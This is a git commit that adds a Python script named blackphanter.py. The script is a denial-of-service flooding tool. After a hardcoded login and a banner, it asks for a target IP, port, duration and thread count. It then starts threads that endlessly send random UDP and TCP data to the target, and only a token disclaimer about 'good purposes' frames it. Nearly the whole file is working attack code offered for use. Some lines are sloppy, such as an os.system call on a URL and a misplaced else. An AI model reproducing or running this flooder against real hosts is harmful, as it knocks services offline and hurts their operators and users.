2a8737f5b1a710eb4efbb2e0415913eb21366720
Kodekeras24 <zhanahmad57@gmail.com>
2024-11-30 07:35:35 +0700

    Create blackphanter.py

---
+++ blackphanter.py
@@ -0,0 +1,144 @@
+# -*- coding: utf-8 -*-
+import logging
+import random
+import socket
+import threading
+import os
+import sys
+import time
+import fade
+
+# Colors
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    UNDERLINE = '\033[4m'
+    PURPLE = '\033[97m'
+    BOLD    = "\033[1m"
+    BLACK   = "\033[30m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
+
+os.system("clear")
+os.system("https://github.com")
+print("\033[37mWelcome to Zona Blackphanter")
+time.sleep(2)
+print("Loading.......")
+
+attemps = 0
+os.system("clear")
+print("")
+print("\033[95m        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @  \033[0m")
+print("\033[95m        @         @  @      @         @   @        @     @    \033[0m")
+print("\033[95m        @         @  @       @       @   @         @   @      \033[0m")
+print("\033[31m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
+print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
+print("\033[31m        @         @  @          @ @       @        @     @    \033[0m")
+print("\033[31m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
+print("")     
+print("\033[91m      @ @ @      @ @   @     @ @ @ @ @ @     @  @ @ @  @ @ @    \033[0m")
+print("\033[91m            @  @     @ @ @   @    @    @     @  @      @     @  \033[0m")
+print("\033[94m      @ @ @    @ @ @ @ @   @ @    @    @ @ @ @  @ @ @  @ @ @    \033[0m")
+print("\033[94m      @        @     @ @     @    @    @     @  @ @ @  @     @  \033[0m")
+print("")
+print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
+print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
+print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
+
+while attemps < 100:
+    username = input('Enter your username: ')
+    password = input('Enter your password: ')
+
+    if username == 'bp4' and password == 'bp4':
+        print('You have successfully logged in Welcome to NUDOS!!')
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
+
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+  
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+											
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+else:
+		th = threading.Thread(target = run4)
+		th.start()
